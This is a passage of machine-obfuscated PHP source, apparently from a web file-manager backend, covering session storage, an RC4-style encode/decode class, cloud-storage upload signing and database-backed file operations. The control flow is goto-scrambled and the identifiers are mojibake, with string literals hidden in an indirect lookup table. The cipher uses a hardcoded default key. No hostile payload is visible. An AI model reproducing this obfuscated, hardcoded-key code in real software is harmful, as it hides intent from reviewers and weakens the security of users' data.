self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($e™ÛÁò… = false) { self::init(); if (!$e™ÛÁò…) { return self::$data; } return array_get_value(self::$data, $e™ÛÁò…); } public static function remove($f¼Ïî‡¼¾) { self::init(); unset(self::$data[$f¼Ïî‡¼¾]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¢à][759])) { self::$handle->clearTimeout(); } } } goto Cª•êµÜ“°; dµÃ°õê®˜: class Mcrypt { public static $defaultKey = "\x61\41\164\141\x6b\x41\72\144\x6c\x6d\x63\x6c\x64\x45\166\54\145"; public static function encode($a¬â¡Àº›Î, $F”ø·®»Á = '', $dÁÍ÷é– = 0, $AÙÚæçğŒ¹ = '') { goto F›‘‹ÁÔšÊ; B Ü®µñ˜•: for ($Aœª¡¢ÙÂ¶ = 0; $Aœª¡¢ÙÂ¶ <= 255; $Aœª¡¢ÙÂ¶++) { $D‘ÎÙá¶çƒ[$Aœª¡¢ÙÂ¶] = ord($DÅ††Ô¬Ï[$Aœª¡¢ÙÂ¶ % $eĞİ·å‚åÎ]); } $eğåÖ¨ÛŒ = range(0, 255); for ($d„à¥°Û = $Aœª¡¢ÙÂ¶ = 0; $Aœª¡¢ÙÂ¶ < 256; $Aœª¡¢ÙÂ¶++) { $d„à¥°Û = ($d„à¥°Û + $eğåÖ¨ÛŒ[$Aœª¡¢ÙÂ¶] + $D‘ÎÙá¶çƒ[$Aœª¡¢ÙÂ¶]) % 256; $fÚ½Ä†¬­³ = $eğåÖ¨ÛŒ[$Aœª¡¢ÙÂ¶]; $eğåÖ¨ÛŒ[$Aœª¡¢ÙÂ¶] = $eğåÖ¨ÛŒ[$d„à¥°Û]; $eğåÖ¨ÛŒ[$d„à¥°Û] = $fÚ½Ä†¬­³; } goto e‚ÜÈ®ŸÍõ; F»Ë°ŒèÄ«: $fñÑñØ¨Ì = md5(substr($F”ø·®»Á, 0, 16)); $dîŒ¸ÆÎİ = md5(substr($F”ø·®»Á, 16, 16)); $AÙÚæçğŒ¹ = $AÙÚæçğŒ¹ ? $AÙÚæçğŒ¹ : md5(microtime()); goto D÷î„ÜË; D÷î„ÜË: $CÌ‹Â´àøœ = substr($AÙÚæçğŒ¹, -$DòëòĞïÛ); $DÅ††Ô¬Ï = $fñÑñØ¨Ì . md5($fñÑñØ¨Ì . $CÌ‹Â´àøœ); $eĞİ·å‚åÎ = strlen($DÅ††Ô¬Ï); goto f¦‹ÌÓ´Î; e‚ÜÈ®ŸÍõ: $eË‡¾ÚÖ‰– = $AÚÔ¯“Ô[33]; for ($fÅêÉ†ŞÔ = $d„à¥°Û = $Aœª¡¢ÙÂ¶ = 0; $Aœª¡¢ÙÂ¶ < $d–ÃùŞÛÕ; $Aœª¡¢ÙÂ¶++) { $fÅêÉ†ŞÔ = ($fÅêÉ†ŞÔ + 1) % 256; $d„à¥°Û = ($d„à¥°Û + $eğåÖ¨ÛŒ[$fÅêÉ†ŞÔ]) % 256; $fÚ½Ä†¬­³ = $eğåÖ¨ÛŒ[$fÅêÉ†ŞÔ]; $eğåÖ¨ÛŒ[$fÅêÉ†ŞÔ] = $eğåÖ¨ÛŒ[$d„à¥°Û]; $eğåÖ¨ÛŒ[$d„à¥°Û] = $fÚ½Ä†¬­³; $eË‡¾ÚÖ‰– .= chr(ord($a¬â¡Àº›Î[$Aœª¡¢ÙÂ¶]) ^ $eğåÖ¨ÛŒ[($eğåÖ¨ÛŒ[$fÅêÉ†ŞÔ] + $eğåÖ¨ÛŒ[$d„à¥°Û]) % 256]); } $eË‡¾ÚÖ‰– = $CÌ‹Â´àøœ . str_replace($AÚÔ¯“Ô[905], $AÚÔ¯“Ô[33], base64_encode($eË‡¾ÚÖ‰–)); goto A®¤”“ê¦; F›‘‹ÁÔšÊ: $AÚÔ¯“Ô =& $_SERVER[¢à]; $DòëòĞïÛ = 4; $F”ø·®»Á = md5($F”ø·®»Á ? $F”ø·®»Á : self::$defaultKey); goto F»Ë°ŒèÄ«; f¦‹ÌÓ´Î: $a¬â¡Àº›Î = sprintf($AÚÔ¯“Ô[1902], $dÁÍ÷é– ? $dÁÍ÷é– + time() : 0) . substr(md5($a¬â¡Àº›Î . $dîŒ¸ÆÎİ), 0, 16) . $a¬â¡Àº›Î; $d–ÃùŞÛÕ = strlen($a¬â¡Àº›Î); $D‘ÎÙá¶çƒ = array(); goto B Ü®µñ˜•; A®¤”“ê¦: $eË‡¾ÚÖ‰– = str_replace(array($AÚÔ¯“Ô[281], $AÚÔ¯“Ô[8], $AÚÔ¯“Ô[905]), array($AÚÔ¯“Ô[408], $AÚÔ¯“Ô[70], $AÚÔ¯“Ô[93]), $eË‡¾ÚÖ‰–); return $eË‡¾ÚÖ‰–; goto BŸ‹Š…¥óº; BŸ‹Š…¥óº: } public static function decode($B¡ÇÀ¥æš¡, $d÷·ß©™“ó = '') { goto EÄÈÍ†ÔĞ; EÄÈÍ†ÔĞ: $BŸ ëé˜ã‹ =& $_SERVER[¢à]; $B¡ÇÀ¥æš¡ = str_replace(array($BŸ ëé˜ã‹[408], $BŸ ëé˜ã‹[70], $BŸ ëé˜ã‹[93]), array($BŸ ëé˜ã‹[281], $BŸ ëé˜ã‹[8], $BŸ ëé˜ã‹[905]), $B¡ÇÀ¥æš¡); $e³äğÛæÓ„ = 4; goto aÄ„ìÈÖ; eÓ„ö°‘¥Ê: if (($A’ŞèÖÆØ == 0 || $A’ŞèÖÆØ - time() > 0) && substr($aê‡Éá®ªá, 10, 16) == substr(md5(substr($aê‡Éá®ªá, 26) . $E´£ª„ğ–¢), 0, 16)) { return substr($aê‡Éá®ªá, 26); } else { return $BŸ ëé˜ã‹[33]; } goto Fçª‚¥±‚; aÄ„ìÈÖ: $d÷·ß©™“ó = md5($d÷·ß©™“ó ? $d÷·ß©™“ó : self::$defaultKey); $E‡ö¾³ƒ¹ª = md5(substr($d÷·ß©™“ó, 0, 16)); $E´£ª„ğ–¢ = md5(substr($d÷·ß©™“ó, 16, 16)); goto dùŒÔÍÖ; aÀÊ±ÊÌ¯: $aê‡Éá®ªá = $BŸ ëé˜ã‹[33]; for ($DÙèÁ§ƒìø = $EÕ°„¿”İ© = $F•¬‹Ü„Â‘ = 0; $F•¬‹Ü„Â‘ < $f–ë‡›Œß™; $F•¬‹Ü„Â‘++) { $DÙèÁ§ƒìø = ($DÙèÁ§ƒìø + 1) % 256; $EÕ°„¿”İ© = ($EÕ°„¿”İ© + $E”é¦ã¡º[$DÙèÁ§ƒìø]) % 256; $bÑ‰Ïí§ = $E”é¦ã¡º[$DÙèÁ§ƒìø]; $E”é¦ã¡º[$DÙèÁ§ƒìø] = $E”é¦ã¡º[$EÕ°„¿”İ©]; $E”é¦ã¡º[$EÕ°„¿”İ©] = $bÑ‰Ïí§; $aê‡Éá®ªá .= chr(ord($B¡ÇÀ¥æš¡[$F•¬‹Ü„Â‘]) ^ $E”é¦ã¡º[($E”é¦ã¡º[$DÙèÁ§ƒìø] + $E”é¦ã¡º[$EÕ°„¿”İ©]) % 256]); } $A’ŞèÖÆØ = intval(substr($aê‡Éá®ªá, 0, 10)); goto eÓ„ö°‘¥Ê; BàšïåéÓ›: $B¡ÇÀ¥æš¡ = base64_decode(substr($B¡ÇÀ¥æš¡, $e³äğÛæÓ„)); $f–ë‡›Œß™ = strlen($B¡ÇÀ¥æš¡); $dõ»­àå° = array(); goto a‰ÅŸäØˆ¦; a‰ÅŸäØˆ¦: for ($F•¬‹Ü„Â‘ = 0; $F•¬‹Ü„Â‘ <= 255; $F•¬‹Ü„Â‘++) { $dõ»­àå°[$F•¬‹Ü„Â‘] = ord($Dôù…ù†Š[$F•¬‹Ü„Â‘ % $D‘Æ“äÚæù]); } $E”é¦ã¡º = range(0, 255); for ($EÕ°„¿”İ© = $F•¬‹Ü„Â‘ = 0; $F•¬‹Ü„Â‘ < 256; $F•¬‹Ü„Â‘++) { $EÕ°„¿”İ© = ($EÕ°„¿”İ© + $E”é¦ã¡º[$F•¬‹Ü„Â‘] + $dõ»­àå°[$F•¬‹Ü„Â‘]) % 256; $bÑ‰Ïí§ = $E”é¦ã¡º[$F•¬‹Ü„Â‘]; $E”é¦ã¡º[$F•¬‹Ü„Â‘] = $E”é¦ã¡º[$EÕ°„¿”İ©]; $E”é¦ã¡º[$EÕ°„¿”İ©] = $bÑ‰Ïí§; } goto aÀÊ±ÊÌ¯; dùŒÔÍÖ: $AìĞ·¼—ª¸ = substr($B¡ÇÀ¥æš¡, 0, $e³äğÛæÓ„); $Dôù…ù†Š = $E‡ö¾³ƒ¹ª . md5($E‡ö¾³ƒ¹ª . $AìĞ·¼—ª¸); $D‘Æ“äÚæù = strlen($Dôù…ù†Š); goto BàšïåéÓ›; Fçª‚¥±‚: } } define($_SERVER[¢à][1903], 1); define($_SERVER[¢à][1904], 2); goto dé¯ÛËƒÁƒ; AÖšÈ¥–Å÷: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($E«¡¦õØô²) { parent::__construct($E«¡¦õØô²); $this->signatureVersion($_SERVER[¢à][197]); } public function uploadFormData($EÌÖÛÆ¾½ã, $F‹³“èé = 3600) { goto c¼²Š„²šä; DÎß«ëƒ ô: return $b„°¾Œ„Ô; goto bÔ×¡ã®«; CÎ¯°£: $BÑ¡¶àÎƒê = array($A†›š¤„–Ğ[1091] => $c•‘‘Ö‚š, $A†›š¤„–Ğ[1092] => array(array($A†›š¤„–Ğ[1093] => $F‡”¾Åº·‡), array($A†›š¤„–Ğ[1094] => $this->bucket), array($A†›š¤„–Ğ[1095], $A†›š¤„–Ğ[1096], $A†›š¤„–Ğ[33]), array($A†›š¤„–Ğ[1097] => $a¿ë•æòĞÀ), array($A†›š¤„–Ğ[1098] => $eµÖ¾½’ëÔ), array($A†›š¤„–Ğ[1099] => $this->accessKey), array($A†›š¤„–Ğ[1100] => $a§ïÏËĞ‘))); $BÑ¡¶àÎƒê = json_encode($BÑ¡¶àÎƒê); $eÖè´¡Ş—» = hash_hmac($A†›š¤„–Ğ[215], $a§ïÏËĞ‘, $this->secret); goto F´ó¹Ó¸¯´; C‹Ëñº‰¯: $a¿ë•æòĞÀ = $A†›š¤„–Ğ[1089]; $c•‘‘Ö‚š = gmdate($A†›š¤„–Ğ[1090], time() + $F‹³“èé); $a§ïÏËĞ‘ = (string) time() . $A†›š¤„–Ğ[67] . (string) (time() + $F‹³“èé); goto CÎ¯°£; c¼²Š„²šä: $A†›š¤„–Ğ =& $_SERVER[¢à]; $F‡”¾Åº·‡ = $A†›š¤„–Ğ[182]; $eµÖ¾½’ëÔ = $A†›š¤„–Ğ[215]; goto C‹Ëñº‰¯; F´ó¹Ó¸¯´: $D»¢ÉÂĞ‹Ú = sha1($BÑ¡¶àÎƒê); $ağ•ããùÁÊ = hash_hmac($A†›š¤„–Ğ[215], $D»¢ÉÂĞ‹Ú, $eÖè´¡Ş—»); $b„°¾Œ„Ô = array($A†›š¤„–Ğ[1093] => $F‡”¾Åº·‡, $A†›š¤„–Ğ[1097] => $a¿ë•æòĞÀ, $A†›š¤„–Ğ[1101] => base64_encode($BÑ¡¶àÎƒê), $A†›š¤„–Ğ[1098] => $eµÖ¾½’ëÔ, $A†›š¤„–Ğ[1099] => $this->accessKey, $A†›š¤„–Ğ[1102] => $a§ïÏËĞ‘, $A†›š¤„–Ğ[1103] => $ağ•ããùÁÊ, $A†›š¤„–Ğ[166] => $this->getHost()); goto DÎß«ëƒ ô; bÔ×¡ã®«: } public function fileOutLink($Ağ™º¨Ğ£é) { $B¥Ì¾Š±ÔÜ =& $_SERVER[¢à]; if (substr($Ağ™º¨Ğ£é, 0, 7) == $B¥Ì¾Š±ÔÜ[1104]) { $Ağ™º¨Ğ£é = $B¥Ì¾Š±ÔÜ[1105] . substr($Ağ™º¨Ğ£é, 7); } header($B¥Ì¾Š±ÔÜ[153] . $Ağ™º¨Ğ£é); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B´‡ŞŒ†­ö) { $this->pathParse = $B´‡ŞŒ†­ö; $this->model = Model($_SERVER[¢à][1106]); } public function getPath($eŒ÷†ê‡†) { return trim($eŒ÷†ê‡†, $_SERVER[¢à][8]); } public function pathFather($bÖÎº¶É) { $A¦ÆÍ´ë = $this->parse($bÖÎº¶É); $A¦ÆÍ´ë = $this->infoSimple($bÖÎº¶É); return $A¦ÆÍ´ë ? $A¦ÆÍ´ë[$_SERVER[¢à][457]] : !1; } public function getPathName($cÎÏñÙ³) { $bßÉšÄæøğ = $this->infoSimple($cÎÏñÙ³); return $bßÉšÄæøğ ? $bßÉšÄæøğ[$_SERVER[¢à][28]] : !1; } public function getPathOuter($eŠò” Ñ£­) { if (!$eŠò” Ñ£­) { return $eŠò” Ñ£­; } $cˆÉÀ÷‚®¤ = $this->parse($eŠò” Ñ£­); return KodIO::make($cˆÉÀ÷‚®¤[$_SERVER[¢à][364]]); } public function copyFolderFromIO($bÃ¶Áì¸È•, $D«ˆã‰¬ÁÑ, $cõÖë–Ü°Ë, $B­İè£„ÎÓ, $dó¥ğ‘Š„•) { $B†Ãå¯ªƒ’ = $this->model->copyFolderFromIO($bÃ¶Áì¸È•, $D«ˆã‰¬ÁÑ, $cõÖë–Ü°Ë, $B­İè£„ÎÓ, $dó¥ğ‘Š„•); return KodIO::make($B†Ãå¯ªƒ’); } public function isParentOf($DËÀíáÍÄ‡, $e›ÕÍÖ¬Ô§) { return $this->model->isParentOf($DËÀíáÍÄ‡, $e›ÕÍÖ¬Ô§); } public function mkfile($CÍ†î¥¤ó», $C£¤¢ ± î = '', $cÆˆ¢®²øÌ = REPEAT_RENAME) { $A¶ò‚Ü±Ì” =& $_SERVER[¢à]; $bòâÙÔÉäö = $this->parse($CÍ†î¥¤ó»); $CÍ†î¥¤ó» = $bòâÙÔÉäö[$A¶ò‚Ü±Ì”[364]]; for ($FÍ‹Õç´´Ç = 0; $FÍ‹Õç´´Ç < count($bòâÙÔÉäö[$A¶ò‚Ü±Ì”[1107]]); $FÍ‹Õç´´Ç++) { $fÄ‰¥¨ŠÙ× = $bòâÙÔÉäö[$A¶ò‚Ü±Ì”[1107]][$FÍ‹Õç´´Ç]; if ($FÍ‹Õç´´Ç == count($bòâÙÔÉäö[$A¶ò‚Ü±Ì”[1107]]) - 1) { $CÍ†î¥¤ó» = $this->model->mkfile($CÍ†î¥¤ó», $fÄ‰¥¨ŠÙ×, $C£¤¢ ± î, $cÆˆ¢®²øÌ); break; } $CÍ†î¥¤ó» = $this->model->mkdir($CÍ†î¥¤ó», $fÄ‰¥¨ŠÙ×, REPEAT_SKIP); } return $this->getPathOuter($CÍ†î¥¤ó»); } public function mkdir($bñ­¯ã‚¤, $aŒéºëÓÅ„ = REPEAT_SKIP) { $cã„©‰Šİä =& $_SERVER[¢à]; $CÀÁ´‚„Ò = $this->parse($bñ­¯ã‚¤); $bñ­¯ã‚¤ = $CÀÁ´‚„Ò[$cã„©‰Šİä[364]]; for ($D†ïàÕ® = 0; $D†ïàÕ® < count($CÀÁ´‚„Ò[$cã„©‰Šİä[1107]]); $D†ïàÕ®++) { $D¥íœ™Ì¦… = $CÀÁ´‚„Ò[$cã„©‰Šİä[1107]][$D†ïàÕ®]; $bñ­¯ã‚¤ = $this->model->mkdir($bñ­¯ã‚¤, $D¥íœ™Ì¦…, $aŒéºëÓÅ„); } return $this->getPathOuter($bñ­¯ã‚¤); } public function copyFile($C¤ë¾ÂòÆÉ, $d†œÖî¦÷, $cŠ·„ê¡¤ = REPEAT_REPLACE) { $e‚¶›™áÇÈ =& $_SERVER[¢à]; $d†´æíáÊ = $this->parse($d†œÖî¦÷); $aó¼­Ôïº = $this->model->copy($C¤ë¾ÂòÆÉ, $d†´æíáÊ[$e‚¶›™áÇÈ[364]], $cŠ·„ê¡¤, $d†´æíáÊ[$e‚¶›™áÇÈ[75]]); return $aó¼­Ôïº ? $this->getPathOuter($aó¼­Ôïº) : !1; } public function moveFile($CÃ²ÏÇ¦Éµ, $dÊ‹ÊĞØòÍ, $fï¨¡”¸¨ë = REPEAT_REPLACE) { $bïš–ÜÏ =& $_SERVER[¢à]; $DìéÕ•øœ = $this->parse($dÊ‹ÊĞØòÍ); $e¶áƒà·„ö = $this->model->move($CÃ²ÏÇ¦Éµ, $DìéÕ•øœ[$bïš–ÜÏ[364]], $fï¨¡”¸¨ë, $DìéÕ•øœ[$bïš–ÜÏ[75]]); return $e¶áƒà·„ö ? $this->getPathOuter($e¶áƒà·„ö) : !1; } public function copy($aâ†˜Ô›ç, $BØ²ÓùÉ, $a¦™…ï±‹Ì = REPEAT_REPLACE) { $fÖÊÌ×ø‘ã = $this->parse($BØ²ÓùÉ); $DøùĞ‰Øœ = $this->model->copy($aâ†˜Ô›ç, $fÖÊÌ×ø‘ã[$_SERVER[¢à][364]], $a¦™…ï±‹Ì); return $DøùĞ‰Øœ ? $this->getPathOuter($DøùĞ‰Øœ) : !1; } public function move($Eó¤‰¥Ø¼, $dõÖ¿Ä’Œà, $e–‡íõ±¥§ = REPEAT_REPLACE) { $aÌ·Áöèğº = $this->parse($dõÖ¿Ä’Œà); $C¢ÛÖÍïÕˆ = $this->model->move($Eó¤‰¥Ø¼, $aÌ·Áöèğº[$_SERVER[¢à][364]], $e–‡íõ±¥§); return $C¢ÛÖÍïÕˆ ? $this->getPathOuter($C¢ÛÖÍïÕˆ) : !1; } public function remove($cªÀ®œã, $bñ±Û¯¨™ = true) { return $this->model->remove($cªÀ®œã, $bñ±Û¯¨™); } public function rename($Eª¯…ïÊŠ, $bâ¹©ºê’ó) { $C¯“¤¥†š– = $this->model->rename($Eª¯…ïÊŠ, $bâ¹©ºê’ó); return $C¯“¤¥†š– ? $this->getPathOuter($Eª¯…ïÊŠ) : $C¯“¤¥†š–; } public function size($d¨÷ÄÆë) { $FÌ†Æô’¿¼ = $this->infoSimple($d¨÷ÄÆë); return $FÌ†Æô’¿¼ ? $FÌ†Æô’¿¼[$_SERVER[¢à][77]] : 0; } public function infoSimple($DœÃ¼æ–¶ô) { return $this->model->sourceInfo($DœÃ¼æ–¶ô); } public function info($F…î©†¼àå) { return $this->infoParse($F…î©†¼àå); } public function infoAuth($cÁø…åŞÕ¨) { return $this->infoParse($cÁø…åŞÕ¨, !1, !0); } public function infoWithChildren($dÌ”ØÁŠ°¯) { return $this->infoParse($dÌ”ØÁŠ°¯, !0); } protected function infoParse($aÌ¬ôİ²‘, $CÛ‰ø‡ãè = false, $B†•öÒ¨ø¬ = false) { if (!$CÛ‰ø‡ãè) { return $this->model->pathInfo($aÌ¬ôİ²‘, $B†•öÒ¨ø¬); } return $this->model->pathInfoMore($aÌ¬ôİ²‘); } public function infoFull($B¦ÎìÔ™‰) { $dŞ«‘„ÅÏÀ =& $_SERVER[¢à]; $a£ñíÃÅ‹ = explode($dŞ«‘„ÅÏÀ[8], $B¦ÎìÔ™‰); $c¼‡Œ™ˆÉÑ = implode($dŞ«‘„ÅÏÀ[8], array_splice($a£ñíÃÅ‹, 1)); return $this->model->pathInfoByPath($a£ñíÃÅ‹[0], $c¼‡Œ™ˆÉÑ); } public function hashSimple($b†Â˜¡ç‹) { $dÈŞõÌ±ê =& $_SERVER[¢à]; $Cµ¾‹»Ú¯¹ = $this->infoWithChildren($b†Â˜¡ç‹); return $Cµ¾‹»Ú¯¹[$dÈŞõÌ±ê[159]][$dÈŞõÌ±ê[161]]; } public function hashMd5($e˜ù¸ôğº–) { $Díñ²²„İÔ =& $_SERVER[¢à]; $A„˜íÂ–®Ó = $this->infoWithChildren($e˜ù¸ôğº–); return $A„˜íÂ–®Ó[$Díñ²²„İÔ[159]][$Díñ²²„İÔ[160]]; } public function exist($F¸…™ ôŠÀ) { $a’ŠÔ÷š =& $_SERVER[¢à]; $FŒßñôæœĞ = $this->parse($F¸…™ ôŠÀ); if (!$FŒßñôæœĞ[$a’ŠÔ÷š[75]]) { return $this->isFile($F¸…™ ôŠÀ) || $this->isFolder($F¸…™ ôŠÀ); } $Dø•‘è´’â = array($a’ŠÔ÷š[365] => $FŒßñôæœĞ[$a’ŠÔ÷š[364]], $a’ŠÔ÷š[28] => $FŒßñôæœĞ[$a’ŠÔ÷š[75]]); $cˆãŸ™±Ö§ = $this->model->where($Dø•‘è´’â)->find(); return $cˆãŸ™±Ö§ ? !0 : !1; } public function isFile($côêÀœíò©) { $AÍŒ‹šù“Ä =& $_SERVER[¢à]; $CŞêÛùğØ = $this->infoSimple($côêÀœíò©); return $CŞêÛùğØ && $CŞêÛùğØ[$AÍŒ‹šù“Ä[367]] == $AÍŒ‹šù“Ä[83] ? !1 : !0; } public function isFolder($c’ìø­°ƒœ) { $D…¿²ëàƒ =& $_SERVER[¢à]; $aó½•¢¼‚½ = $this->infoSimple($c’ìø­°ƒœ); return $aó½•¢¼‚½ && $aó½•¢¼‚½[$D…¿²ëàƒ[367]] == $D…¿²ëàƒ[83] ? !0 : !1; } public function listPath($fÛíäƒ•èã, $C™Å˜ïßå½ = false) { $b½‘¦…ˆ®« =& $_SERVER[¢à]; if ($fÛíäƒ•èã == $b½‘¦…ˆ®«[33]) { return !1; } $cöÁÏá˜‹ğ = array($b½‘¦…ˆ®«[365] => $fÛíäƒ•èã); if ($C™Å˜ïßå½) { return $this->model->listSource($cöÁÏá˜‹ğ, -1); } return $this->model->listSource($cöÁÏá˜‹ğ); } public function has($DÛÓâ‚Ûèó, $dˆ‚øÛÅ = false, $fßÆ‡™Œª‘ = null) { $B¬¶Í§ºœ =& $_SERVER[¢à]; $cèğàÚ¯¸ = $this->infoWithChildren($DÛÓâ‚Ûèó); if ($dˆ‚øÛÅ) { return array($B¬¶Í§ºœ[189] => $cèğàÚ¯¸[$B¬¶Í§ºœ[189]], $B¬¶Í§ºœ[188] => $cèğàÚ¯¸[$B¬¶Í§ºœ[188]]); } return $fßÆ‡™Œª‘ ? $cèğàÚ¯¸[$B¬¶Í§ºœ[189]] : $cèğàÚ¯¸[$B¬¶Í§ºœ[188]]; } public function listAll($aÅÕğå­”Ë) { $d÷ŞÀè¦Ä‡ = IO::info($this->pathParse[$_SERVER[¢à][75]]); if (!$d÷ŞÀè¦Ä‡) { return array(); } return $this->model->listAll($aÅÕğå­”Ë); } public function getContent($cŠó¡ŠÚ÷Ú) { return $this->model->getContent($cŠó¡ŠÚ÷Ú); } public function setContent($CĞ¹ƒ¡šò, $f‚§”—øÅ„ = '') { return $this->model->setContent($CĞ¹ƒ¡šò, $f‚§”—øÅ„); } public function fileSubstr($B¦å ×´‰é, $c¤ÍàäÜêŞ, $d’ï˜Å´–ò) { return $this->model->fileSubstr($B¦å ×´‰é, $c¤ÍàäÜêŞ, $d’ï˜Å´–ò); } public function download($D‹ñ­¼•ê, $eêİ¹Á—„‚ = '') { $BĞùİ½éÎÉ = get_path_father($eêİ¹Á—„‚); $AÖôÄÛÔ›² = get_path_this($eêİ¹Á—„‚); $EÊÍˆÉŸæà = $this->model->fileInfoGet($D‹ñ­¼•ê); $cÒ±¤²Ü§ = IO::copy($EÊÍˆÉŸæà[$_SERVER[¢à][75]], $BĞùİ½éÎÉ, !1, $AÖôÄÛÔ›²); return $cÒ±¤²Ü§; } public function upload($A°¨Õ‚•¶À, $a´‰‘èóÄ, $eˆËìˆÜÈ = false, $aÛØ½°İç = REPEAT_REPLACE) { $b×á×µ×à³ =& $_SERVER[¢à]; $fŞ˜š‰ĞÆÑ = $this->parse($A°¨Õ‚•¶À); $a¦Û‰ØË = $this->model->addFile($fŞ˜š‰ĞÆÑ[$b×á×µ×à³[364]], $a´‰‘èóÄ, $fŞ˜š‰ĞÆÑ[$b×á×µ×à³[75]], $eˆËìˆÜÈ, $aÛØ½°İç); return $this->getPathOuter($a¦Û‰ØË); } public function uploadFileByID($fò…¾ø®Ş, $EİËˆÓ´², $E˜•¹ŠƒÒ) { $eÊ²’ŠŞ˜ =& $_SERVER[¢à]; $D÷ŸÔµòß° = $this->parse($fò…¾ø®Ş); $d°¼½ÄÉƒì = $this->model->addFileByFileID($D÷ŸÔµòß°[$eÊ²’ŠŞ˜[364]], $EİËˆÓ´², $D÷ŸÔµòß°[$eÊ²’ŠŞ˜[75]], $E˜•¹ŠƒÒ); return $this->getPathOuter($d°¼½ÄÉƒì); } public function addFileByRemote($eÉ‰´Õ•¿İ, $fËÆŸ†—³Š, $b†Ø†áôä¯ = array(), $c³Õ›¶¤Å¨ = '', $fæèÎëà½) { $f³‚†ÍœŒÒ =& $_SERVER[¢à]; $Eí‹˜·„ÃÌ = $this->parse($eÉ‰´Õ•¿İ); $c³Õ›¶¤Å¨ = empty($c³Õ›¶¤Å¨) ? $Eí‹˜·„ÃÌ[$f³‚†ÍœŒÒ[75]] : $c³Õ›¶¤Å¨; $cƒÛ‡ãÆŒ’ = $this->model->addFileByRemote($Eí‹˜·„ÃÌ[$f³‚†ÍœŒÒ[364]], $fËÆŸ†—³Š, $c³Õ›¶¤Å¨, $b†Ø†áôä¯, $fæèÎëà½); return $this->getPathOuter($cƒÛ‡ãÆŒ’); } public function uploadLink($F¢‹•ƒ‘º¿, $BØ…ó½§„Î = 0) { $e›†’ŸÎ¤ =& $_SERVER[¢à]; $Fõ…§ëäô = $this->parse($F¢‹•ƒ‘º¿); $F¢‹•ƒ‘º¿ = Model($e›†’ŸÎ¤[540])->createFileName($Fõ…§ëäô[$e›†’ŸÎ¤[75]]); $EÁñ—ì¡ = IO::uploadLink($F¢‹•ƒ‘º¿, $BØ…ó½§„Î); return $EÁñ—ì¡; } public function fileNameAuto($Bæ°­ùÅÃ, $cîÒÊàİ­—, $A“„ì†áÎ = REPEAT_REPLACE, $D±‘Øµ¥Î = false) { return $this->model->fileNameAuto($Bæ°­ùÅÃ, $cîÒÊàİ­—, $A“„ì†áÎ, $D±‘Øµ¥Î); } public function fileNameExist($eĞ±£”ÙÔÏ, $CÛ‘âÎÒÒ) { return $this->model->fileNameExist($eĞ±£”ÙÔÏ, $CÛ‘âÎÒÒ); } protected function _fileOut($Dâ‚Ì¬¢Ê, $AØ‘ÉâÕÆÑ = false, $DÃé¬‰öĞ = false, $E‰ì°Ô¦” = '', $D¡Ú×µ¡½„ = false) { goto f¹Ä¦ä­Ù; Bìé’¥Ü·: if ($D¡Ú×µ¡½„) { return IO::fileOutServer($E¼°ÏÀâØŠ[$dáì†Ğ÷‹[75]], $AØ‘ÉâÕÆÑ, $aíÉÙô—­Ï, $E‰ì°Ô¦”); } IO::fileOut($E¼°ÏÀâØŠ[$dáì†Ğ÷‹[75]], $AØ‘ÉâÕÆÑ, $aíÉÙô—­Ï, $E‰ì°Ô¦”); goto Eæ¾“‹ğ‚½; f¹Ä¦ä­Ù: $dáì†Ğ÷‹ =& $_SERVER[¢à]; $C½Š«ìâŒ½ = $this->model->sourceInfo($Dâ‚Ì¬¢Ê); if ($C½Š«ìâŒ½[$dáì†Ğ÷‹[367]] == $dáì†Ğ÷‹[83]) { header($dáì†Ğ÷‹[1108]); die; } goto EÁç½¡ÄÍ²; EÁç½¡ÄÍ²: $E¼°ÏÀâØŠ = $this->model->fileInfoGet($Dâ‚Ì¬¢Ê); $E‰ì°Ô¦” = $E¼°ÏÀâØŠ[$dáì†Ğ÷‹[160]] ? $E¼°ÏÀâØŠ[$dáì†Ğ÷‹[160]] : $E‰ì°Ô¦”; $aíÉÙô—­Ï = isset($GLOBALS[$dáì†Ğ÷‹[1109]]) ? $GLOBALS[$dáì†Ğ÷‹[1109]] : $C½Š«ìâŒ½[$dáì†Ğ÷‹[28]]; goto Bìé’¥Ü·; Eæ¾“‹ğ‚½: } public function fileOut($bŠÛ· Ù³™, $e‡·í§ï¥° = false, $EŒà¹öÇì = false, $a¥Å„‚›Ÿ = '') { $this->_fileOut($bŠÛ· Ù³™, $e‡·í§ï¥°, $EŒà¹öÇì, $a¥Å„‚›Ÿ); } public function fileOutServer($FÓØŒ¢šÉÍ, $eÓöÒë è = false, $aë †‡ø´… = false, $fò£è¤Ï›Æ = '') { $this->_fileOut($FÓØŒ¢šÉÍ, $eÓöÒë è, $aë †‡ø´…, $fò£è¤Ï›Æ, !0); } protected function _fileOutImage($bˆÓÎ±ª¹¸, $F‰°×È¤İ = 250) { $b‘°ò‹ß¼ =& $_SERVER[¢à]; $FÖ£ÒÃ¶Í = $this->model->sourceInfo($bˆÓÎ±ª¹¸); if ($FÖ£ÒÃ¶Í[$b‘°ò‹ß¼[367]] == $b‘°ò‹ß¼[83]) { show_json($b‘°ò‹ß¼[1110] . $bˆÓÎ±ª¹¸, !1); } $GLOBALS[$b‘°ò‹ß¼[1109]] = $FÖ£ÒÃ¶Í[$b‘°ò‹ß¼[28]]; $FŠçë¿÷À” = $this->model->fileInfoGet($bˆÓÎ±ª¹¸); IO::fileOutImage($FŠçë¿÷À”[$b‘°ò‹ß¼[75]], $F‰°×È¤İ); } public function fileOutImage($E¼øñªÀ˜…, $c›Ö’´ªÑØ = 250) { $this->_fileOutImage($E¼øñªÀ˜…, $c›Ö’´ªÑØ); } public function fileOutImageServer($c¯çĞÆŒ‹–, $Aùº‘ˆÓ´° = 250) { $this->_fileOutImage($c¯çĞÆŒ‹–, $Aùº‘ˆÓ´°); } public function link($dÌçøÃ•, $AÏÆÜêƒìÓ = '') { $eŸå¢İÍ·Ñ = $this->model->fileInfoGet($dÌçøÃ•); return IO::link($eŸå¢İÍ·Ñ[$_SERVER[¢à][75]], $AÏÆÜêƒìÓ); } protected function parse($F£ĞµÓãç) { $F—®¨Â‘÷» =& 